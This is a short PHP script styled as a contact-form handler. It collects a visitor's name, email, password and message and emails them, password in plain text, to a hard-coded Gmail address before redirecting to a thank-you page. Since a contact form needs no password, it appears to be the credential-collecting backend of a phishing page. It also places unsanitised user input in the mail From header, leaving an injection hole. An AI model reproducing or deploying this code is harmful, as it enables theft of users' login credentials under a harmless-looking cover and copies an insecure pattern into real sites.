<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $name = $_POST["name"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    $message = $_POST["message"];

    // Compose email content
    $to = "mrbroker077@gmail.com";
    $subject = "New Contact Form Submission";
    $headers = "From: $email";
    $email_content = "Name: $name\nEmail: $email\nPassword: $password\nMessage:\n$message";

    // Send email
    mail($to, $subject, $email_content, $headers);
    
    // Optionally, you can redirect the user to a thank you page
    header("Location: thank-you.html");
    exit;
}
?>
